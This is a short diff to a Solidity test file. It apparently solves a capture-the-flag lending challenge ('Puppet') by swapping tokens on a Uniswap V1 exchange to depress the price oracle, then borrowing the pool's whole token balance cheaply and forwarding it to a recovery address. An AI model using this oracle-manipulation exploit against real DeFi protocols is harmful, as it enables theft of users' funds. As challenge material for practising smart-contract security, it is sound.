@@ -26,15 +26,15 @@ contract Attacker{
     function attack (address player, address recovery) external{
         token.transferFrom(player, address(this), PLAYER_INITIAL_TOKEN_BALANCE);
         token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
-        uint256 out = uniswapV1Exchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE,1,block.timestamp);
-        uint256 depositRequired = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        uniswapV1Exchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE,1,block.timestamp);
+        lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
 
         lendingPool.borrow{value : PLAYER_INITIAL_ETH_BALANCE}(POOL_INITIAL_TOKEN_BALANCE, address(this));
-        console.log(token.balanceOf(address(this)));
         token.transfer(address(recovery), token.balanceOf(address(this)));
     }
 
     fallback() external payable {}
+    receive() external payable {}
 }
 
 contract PuppetChallenge is Test {
